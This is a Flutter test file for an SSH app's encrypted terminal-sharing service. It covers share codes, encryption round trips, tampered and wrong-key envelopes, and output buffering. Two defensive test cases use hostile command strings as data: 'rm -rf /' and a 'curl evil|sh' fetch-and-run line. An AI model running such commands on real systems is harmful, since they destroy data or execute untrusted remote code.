import 'dart:convert';
import 'package:flutter_test/flutter_test.dart';
import 'package:yourssh/models/share_event.dart';
import 'package:yourssh/services/share_crypto.dart';
import 'package:yourssh/services/share_session_service.dart';

void main() {
  group('generateShareCode', () {
    test('has ROOM-SECRET format with 6 + 16 chars', () {
      final code = ShareSessionService.generateShareCode();
      expect(code.length, 23);
      expect(code[6], '-');
    });

    test('contains only unambiguous uppercase alphanumeric chars', () {
      for (var i = 0; i < 20; i++) {
        final code = ShareSessionService.generateShareCode();
        expect(RegExp(r'^[A-HJ-NP-Z2-9]{6}-[A-HJ-NP-Z2-9]{16}$').hasMatch(code),
            isTrue,
            reason: 'code "$code" contains unexpected chars');
      }
    });

    test('produces different codes on subsequent calls', () {
      final codes =
          List.generate(10, (_) => ShareSessionService.generateShareCode());
      expect(codes.toSet().length, 10);
    });
  });

  group('ShareCrypto', () {
    test('normalizeCode is case/space/dash insensitive', () {
      final c = ShareSessionService.generateShareCode();
      final messy = ' ${c.toLowerCase().replaceAll('-', ' - ')} ';
      expect(ShareCrypto.normalizeCode(messy), c);
      expect(ShareCrypto.normalizeCode(c.replaceAll('-', '')), c);
    });

    test('normalizeCode rejects malformed codes', () {
      expect(ShareCrypto.normalizeCode('ABC123'), isNull);
      expect(ShareCrypto.normalizeCode(''), isNull);
      expect(ShareCrypto.normalizeCode('AAAAAA-AAAAAAAAAAAAAAA0'), isNull);
      expect(ShareCrypto.normalizeCode('AAAAAA-AAAAAAAAAAAAAAAAA'), isNull);
    });

    test('channel name hides the secret and differs per code', () {
      final a = ShareSessionService.generateShareCode();
      final b = ShareSessionService.generateShareCode();
      final ca = ShareCrypto.channelName(a);
      expect(ca, matches(RegExp(r'^share:[0-9a-f]{32}$')));
      expect(ca, isNot(ShareCrypto.channelName(b)));
      expect(ca.contains(a.substring(7)), isFalse);
      expect(ca.contains(a.substring(0, 6)), isFalse);
      expect(ShareCrypto.channelName(a), ca);
    });

    test('encrypt/decrypt round trip', () async {
      final code = ShareSessionService.generateShareCode();
      final crypto = ShareCrypto(code);
      final env = await crypto.encrypt({'type': 'output', 'data': 'secret!'});
      expect(env['v'], 1);
      expect(env.containsKey('type'), isFalse);
      expect(jsonEncode(env).contains('secret!'), isFalse);
      final back = await ShareCrypto(code.toLowerCase()).decrypt(env);
      expect(back, {'type': 'output', 'data': 'secret!'});
    });

    test('fresh nonce per message', () async {
      final crypto = ShareCrypto(ShareSessionService.generateShareCode());
      final a = await crypto.encrypt({'type': 'ended'});
      final b = await crypto.encrypt({'type': 'ended'});
      expect(a['n'], isNot(b['n']));
    });

    test('tampered envelope is dropped', () async {
      final crypto = ShareCrypto(ShareSessionService.generateShareCode());
      final env = await crypto.encrypt({'type': 'output', 'data': 'x'});
      final bytes = base64Decode(env['c'] as String);
      bytes[0] ^= 0x01;
      final tampered = {...env, 'c': base64Encode(bytes)};
      expect(await crypto.decrypt(tampered), isNull);
    });

    test('wrong-key envelope is dropped', () async {
      final a = ShareCrypto(ShareSessionService.generateShareCode());
      final b = ShareCrypto(ShareSessionService.generateShareCode());
      final env = await a.encrypt({'type': 'input', 'data': 'rm -rf /'});
      expect(await b.decrypt(env), isNull);
    });

    test('plaintext / malformed payloads are dropped', () async {
      final crypto = ShareCrypto(ShareSessionService.generateShareCode());
      expect(await crypto.decrypt({'type': 'input', 'data': 'curl evil|sh\n'}),
          isNull);
      expect(await crypto.decrypt({'v': 1, 'n': 'zz', 'c': 5}), isNull);
      expect(await crypto.decrypt({'v': 2, 'n': 'AA==', 'c': 'AA=='}), isNull);
      expect(await crypto.decrypt({}), isNull);
    });
  });

  group('rejection targeting', () {
    test('rejected event round-trips targetGuestId', () {
      final e = ShareEvent.fromJson(ShareEvent.rejected('full', 'g1').toJson());
      expect(e.type, ShareEventType.rejected);
      expect(e.targetGuestId, 'g1');
    });

    test('guest ignores rejection for another guest', () {
      final svc = ShareSessionService.forTest();
      final got = <ShareEvent>[];
      svc.events.listen(got.add);
      svc.handleGuestEventForTest(ShareEvent.rejected('full', 'other'));
      svc.handleGuestEventForTest(ShareEvent.rejected('full', svc.guestId));
      svc.handleGuestEventForTest(ShareEvent.rejected('full', null));
      return Future<void>.delayed(Duration.zero).then((_) {
        expect(got.length, 1);
        expect(got.single.targetGuestId, svc.guestId);
      });
    });
  });

  group('output buffer', () {
    test('trims buffer when it exceeds max size', () {
      final svc = ShareSessionService.forTest();
      final chunk = 'x' * 10000;
      for (var i = 0; i < 60; i++) {
        svc.appendToBufferForTest(chunk);
      }
      expect(svc.bufferLengthForTest, lessThanOrEqualTo(ShareSessionService.maxBufferLength));
    });

    test('retains recent content after trim', () {
      final svc = ShareSessionService.forTest();
      final chunk = 'x' * 10000;
      for (var i = 0; i < 60; i++) {
        svc.appendToBufferForTest(chunk);
      }
      svc.appendToBufferForTest('MARKER');
      expect(svc.bufferSnapshotForTest, contains('MARKER'));
    });
  });
}
